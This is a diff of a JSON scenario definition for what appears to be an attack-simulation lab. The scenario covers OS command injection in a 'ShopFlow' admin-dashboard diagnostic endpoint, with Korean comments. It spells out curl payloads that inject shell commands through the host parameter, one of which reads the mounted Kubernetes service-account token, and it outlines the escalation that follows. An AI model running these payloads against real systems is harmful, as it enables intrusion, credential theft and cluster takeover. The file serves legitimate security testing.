@@ -1,25 +1,28 @@
 {
   "_note": "핵심층 환경 — ShopFlow admin-dashboard OS Command Injection(A3). 내부 관리 콘솔의 진단 엔드포인트에 셸 메타문자를 주입해 RCE. 이 파드에 마운트된 과권한 admin-sa 토큰을 탈취하면 T1610(악성 파드 배포)·T1611(호스트 탈출)로 이어진다. 방어: patch_app admin-dashboard(shell=False + host 검증).",
-
   "env": "shopflow-cmdi",
-  "technique": "T1059",
+  "technique": "WEB_CMDI",
   "cwe": "CWE-78",
-
   "procedure": {
     "id": "PROC-shopflow-cmdi",
     "name": "admin-dashboard 진단 엔드포인트 OS 커맨드 인젝션",
     "description": "frontend 발판에서 admin-dashboard /admin/diag?host= 에 셸 메타문자(;·|·`)를 주입해 임의 명령을 실행한다. 이 파드는 과권한 admin-sa 토큰이 마운트돼 있어 cat /var/run/secrets/.../token 으로 토큰을 탈취한 뒤 k8s API 로 privileged 파드 배포(T1610)→호스트 탈출(T1611)이 가능하다.",
     "status": "AUTHORED",
     "steps": [
-      {"id": "STEP-cmdi-id", "seq": 1,
-       "command": "curl -sG http://admin-dashboard.internal.svc.cluster.local:8080/admin/diag --data-urlencode \"host=127.0.0.1;id\"",
-       "description": "명령 인젝션 가능 여부 확인(id 명령 실행)"},
-      {"id": "STEP-cmdi-token", "seq": 2,
-       "command": "curl -sG http://admin-dashboard.internal.svc.cluster.local:8080/admin/diag --data-urlencode \"host=127.0.0.1;cat /var/run/secrets/kubernetes.io/serviceaccount/token\"",
-       "description": "admin-sa 토큰 탈취 — 이 토큰으로 k8s API 에 Secret 조회·파드 생성이 가능"}
+      {
+        "id": "STEP-cmdi-id",
+        "seq": 1,
+        "command": "curl -sG http://admin-dashboard.internal.svc.cluster.local:8080/admin/diag --data-urlencode \"host=127.0.0.1;id\"",
+        "description": "명령 인젝션 가능 여부 확인(id 명령 실행)"
+      },
+      {
+        "id": "STEP-cmdi-token",
+        "seq": 2,
+        "command": "curl -sG http://admin-dashboard.internal.svc.cluster.local:8080/admin/diag --data-urlencode \"host=127.0.0.1;cat /var/run/secrets/kubernetes.io/serviceaccount/token\"",
+        "description": "admin-sa 토큰 탈취 — 이 토큰으로 k8s API 에 Secret 조회·파드 생성이 가능"
+      }
     ]
   },
-
   "preconditions": [
     {
       "id": "PRE-cmdi-diag-reachable",
@@ -27,15 +30,22 @@
       "description": "frontend 발판에서 admin-dashboard.internal.svc.cluster.local:8080 에 HTTP 요청을 보낼 수 있고, /admin/diag 가 shell=True 로 host 파라미터를 실행."
     }
   ],
-
   "expected_results": [
     {
       "id": "ER-cmdi-progress",
       "name": "커맨드 인젝션 RCE 흔적 (진행도)",
       "kind": "progress",
-      "outcome": {"id": "AO-command-execution", "name": "명령 실행"},
+      "outcome": {
+        "id": "AO-command-execution",
+        "name": "명령 실행"
+      },
       "conditions": [
-        {"channel": "app", "field": "technique", "operator": "eq", "expected": "WEB_CMDI"}
+        {
+          "channel": "app",
+          "field": "technique",
+          "operator": "eq",
+          "expected": "WEB_CMDI"
+        }
       ]
     }
   ]
